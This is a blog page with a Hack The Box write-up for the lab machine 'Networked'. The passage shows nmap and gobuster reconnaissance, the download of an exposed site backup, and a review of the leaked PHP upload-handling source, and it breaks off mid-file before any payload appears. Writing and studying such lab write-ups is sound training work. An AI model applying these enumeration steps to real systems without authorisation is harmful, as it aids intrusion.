<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Always stay close to what keeps you feeling alive!">
    <meta name="author" content="Sabe Barker">

    <title>Networked - Hack The Box · Sabe Barker</title>

    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/networked/">

    <!-- Bootstrap core CSS -->
    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
	<!-- Custom CSS -->
    <link href="/assets/css/sabe.css" rel="stylesheet">
    <!-- Lightbox -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
    <!-- Favicons -->
	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
	<link rel="manifest" href="/assets/img/favicons/manifest.json">
	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
	<link rel="icon" href="/assets/img/favicons/favicon.ico">
	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
	<meta name="application-name" content="Sabe Barker">
	<meta name="msapplication-TileColor" content="#fff">
	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
	<meta name="theme-color" content="#fff">
	
    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@sabebarker">
    <meta name="twitter:creator" content="@sabebarker">
    <meta name="twitter:title" content="Networked - Hack The Box · Sabe Barker">
    <meta name="twitter:description" content="Always stay close to what keeps you feeling alive!">
    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/networked/networked_infocard.png">

    <!-- Facebook -->
    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/networked/" />
    <meta property="og:title" content="Networked - Hack The Box · Sabe Barker">
    <meta property="og:description" content="Always stay close to what keeps you feeling alive!">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/networked/networked_infocard.png">
    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/networked/networked_infocard.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
	<script>
  		window.dataLayer = window.dataLayer || [];
  		function gtag(){dataLayer.push(arguments);}
  		gtag('js', new Date());

  		gtag('config', 'UA-151243373-1');
	</script>
  </head>
  <body>
    <a class="skippy sr-only sr-only-focusable" href="#content">
      <span class="skippy-text">Skip to main content</span>
    </a>

    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewbox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><lineargradient id="SVGID_1_" gradientunits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"></stop><stop offset="1" stop-color="#0bb1d3"></stop></lineargradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"></path></svg>{ sabebarker }
      </a>

      <div class="navbar-nav-scroll">
        <ul class="navbar-nav sb-navbar-nav flex-row">
          <li class="nav-item">
            <a class="nav-link " href="/search">
        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewbox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
      </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/">
	      Home
	     </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/blog">
	      Blog
	    </a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="/writeups">
	      Writeups
	    </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/tools">
	      Tools
	    </a>
          </li>
        </ul>
      </div>

      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
        <li class="nav-item">
          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title>
<path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"></path></svg></a>
       </li>
       <li class="nav-item">
         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title>
<path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"></path></svg></a>
       </li>
       <li class="nav-item">
         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 24 24" role="img" focusable="false"><title>Facebook</title>
<path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"></path><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"></path></svg></a>
       </li>
      </ul>
    </header>


    <div class="container-fluid">
      <div class="row flex-xl-nowrap">
        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewbox="0 0 30 30" role="img" focusable="false"><title>Menu</title>
<path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button>

<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
        Getting Started
      </a>

      <ul class="nav sb-sidenav">
<li>
            <a href="/writeups/hackthebox/getting-started/introduction/">
              Introduction
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/getting-started/basic-setup/">
              Basic Setup
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
              VPN Setup
            </a>
          </li>
</ul>
    </div>
<div class="sb-toc-item active">
      <a class="sb-toc-link" href="/writeups/hackthebox/machines/obscurity/">
        Machines
      </a>

      <ul class="nav sb-sidenav">
<li>
            <a href="/writeups/hackthebox/machines/obscurity/">
              Obscurity
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/openadmin/">
              OpenAdmin
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/mango/">
              Mango
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/traverxec/">
              Traverxec
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/forest/">
              Forest
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/postman/">
              Postman
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/scavenger/">
              Scavenger
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/json/">
              Json
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/ai/">
              AI
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/bitlab/">
              Bitlab
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/craft/">
              Craft
            </a>
          </li>
<li class="active sb-sidenav-active">
            <a href="/writeups/hackthebox/machines/networked/">
              Networked
            </a>
          </li>
</ul>
    </div></nav>
        </div>

        
          <div class="d-none d-xl-block col-xl-2 sb-toc">
            <ul class="section-nav">
<li class="toc-entry toc-h2">
<a href="#enumeration">Enumeration</a>
<ul>
<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
<li class="toc-entry toc-h3"><a href="#directories">Directories</a></li>
<li class="toc-entry toc-h3">
<a href="#information-leak">Information Leak</a>
<ul>
<li class="toc-entry toc-h4"><a href="#indexphp">index.php</a></li>
<li class="toc-entry toc-h4"><a href="#libphp">lib.php</a></li>
<li class="toc-entry toc-h4"><a href="#uploadphp">upload.php</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#foothold">Foothold</a>
<ul>
<li class="toc-entry toc-h3">
<a href="#information-leak-1">Information Leak</a>
<ul>
<li class="toc-entry toc-h4"><a href="#check_attackphp">check_attack.php</a></li>
<li class="toc-entry toc-h4"><a href="#crontabguly">crontab.guly</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#user">User</a></li>
<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
</ul>
          </div>
        

        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
          <h1 class="sb-title" id="content">Networked</h1>
          <p class="sb-lead">Always stay close to what keeps you feeling alive!</p>
          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/networked/networked_infocard.png" alt="HackTheBox Networked Machine Info Card" class="img-fluid"></p>

<p><strong>Networked</strong> is an easy difficulty machine running Linux. It tests your knowledge in <em>PHP</em> and basic privilege escalation. Without some knowledge of <em>PHP</em> you may find this machine a bit challenging.</p>

<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section before you get started.</p>

<h2 id="enumeration">Enumeration</h2>

<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>

<h3 id="portscan">Portscan</h3>

<p>First let’s use my “advanced” <a href="/writeups/hackthebox/getting-started/basic-setup/#portscan">portscan</a> script to find open ports:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan networked.htb
Grabbing ports...
Ports grabbed!
Scanning...
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-11-02 13:39 GMT
Nmap scan report <span class="k">for </span>networked.htb <span class="o">(</span>10.10.10.146<span class="o">)</span>
Host is up <span class="o">(</span>0.36s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b <span class="o">(</span>RSA<span class="o">)</span>
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open   http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.23 seconds</code></pre></figure>

<p>As we can see from our port scan we have <code class="highlighter-rouge">ssh</code> open on port <code class="highlighter-rouge">22</code> and <code class="highlighter-rouge">http</code> open on port <code class="highlighter-rouge">80</code>. Since at this point we have no username and password we will leave <code class="highlighter-rouge">ssh</code> and go for <code class="highlighter-rouge">http</code>. Navigating to the site  we are greeted with with following page:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/networked/networked.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/networked/networked.htb.png" alt="Networked Main Screenshot" class="img-fluid"></a></p>

<p>Nothing to look at. No links to have a navigate around. Taking a look at the source we see a comment: <code class="highlighter-rouge">&lt;!-- upload and gallery not yet linked --&gt;</code>. Seems like there are some directories for us to find.</p>

<h3 id="directories">Directories</h3>

<p>We will use <code class="highlighter-rouge">gobuster</code> to bruteforce any interesting directories that may be of use to us:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://networked.htb <span class="nt">-t</span> 30 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://networked.htb
<span class="o">[</span>+] Threads:        100
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/01/07 04:33:45 Starting gobuster
<span class="o">===============================================================</span>
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
/backup <span class="o">(</span>Status: 301<span class="o">)</span>
/cgi-bin/ <span class="o">(</span>Status: 403<span class="o">)</span>
/uploads <span class="o">(</span>Status: 301<span class="o">)</span>
<span class="o">===============================================================</span>
2020/01/07 04:34:40 Finished
<span class="o">===============================================================</span></code></pre></figure>

<p>Here we go! Something for us to work with. Straight off the mark we see two folders of interest. A <code class="highlighter-rouge">backup</code> folder which with any luck will have some backups with juicy info for us to bite our teeth in to and an <code class="highlighter-rouge">uploads</code> folder. Which means that there is most likely some way to upload files to the machine.</p>

<p>Let’s take a look and see what we can find.</p>

<p>Navigating to <code class="highlighter-rouge">http://networked.htb/backup/</code> gives us an index listing:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/networked/networked.htb_backup.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/networked/networked.htb_backup.png" alt="Networked Backups Screenshot" class="img-fluid"></a></p>

<p>Nice! We have a backup it seems.</p>

<h3 id="information-leak">Information Leak</h3>

<p>Lets download and extract it’s contents to see what we have:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">wget http://networked.htb/backup/backup.tar <span class="o">&amp;&amp;</span> <span class="nb">tar</span> <span class="nt">-xvf</span> backup.tar
http://networked.htb/backup/backup.tar
Resolving networked.htb <span class="o">(</span>networked.htb<span class="o">)</span>... 10.10.10.146
Connecting to networked.htb <span class="o">(</span>networked.htb<span class="o">)</span>|10.10.10.146|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240 <span class="o">(</span>10K<span class="o">)</span> <span class="o">[</span>application/x-tar]
Saving to: ‘backup.tar’

backup.tar  100%[<span class="o">===============================&gt;]</span>  10.00K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2019-11-15 09:12:34 <span class="o">(</span>72.0 MB/s<span class="o">)</span> - ‘backup.tar’ saved <span class="o">[</span>10240/10240]

index.php
lib.php
photos.php
upload.php</code></pre></figure>

<p>So here we have four files. We can see these files in the root directory of the site.</p>

<p>We have the <code class="highlighter-rouge">index.php</code> that we saw earlier.</p>

<p>A file called <code class="highlighter-rouge">library.php</code> which is blank (most likely due to there being no php output or html).</p>

<p>Another file called <code class="highlighter-rouge">photos.php</code> that is a photo gallery where the images seemed to be named using an IP address:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/networked/networked.htb_photos.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/networked/networked.htb_photos.png" alt="Networked Photos Screenshot" class="img-fluid"></a></p>

<p>Then theres the <code class="highlighter-rouge">upload.php</code> file which confirms that we will most likely be able to upload a file and hopefully a payload:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/networked/networked.htb_upload.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/networked/networked.htb_upload.png" alt="Networked Upload Screenshot" class="img-fluid"></a></p>

<p>Since we have all the files let’s investigate them further to see what types of files we can upload and how the upload form functions.</p>

<h4 id="indexphp">index.php</h4>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
Hello mate, we're building the new FaceMash!<span class="nt">&lt;/br&gt;</span>
Help by funding us and be the new Tyler<span class="err">&amp;</span>Cameron!<span class="nt">&lt;/br&gt;</span>
Join us at the pool party this Sat to get a glimpse
<span class="c">&lt;!-- upload and gallery not yet linked --&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<p>Ok so literally just some <code class="highlighter-rouge">html</code> nothing exciting. Let’s move along.</p>

<h4 id="libphp">lib.php</h4>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">getnameCheck</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="c1">#echo "name $name - ext $ext\n";</span>
  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">getnameUpload</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span>
  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">check_ip</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">//echo "prefix: $prefix - fname: $filename&lt;br&gt;\n";</span>
  <span class="nv">$ret</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">)))</span> <span class="p">{</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">"4tt4ck on file "</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">": prefix is not a valid ip "</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'finfo_file'</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$finfo</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">))</span> <span class="c1">// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system</span>
    <span class="p">{</span>
      <span class="nv">$mime</span> <span class="o">=</span> <span class="o">@</span><span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
      <span class="nb">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$mime</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
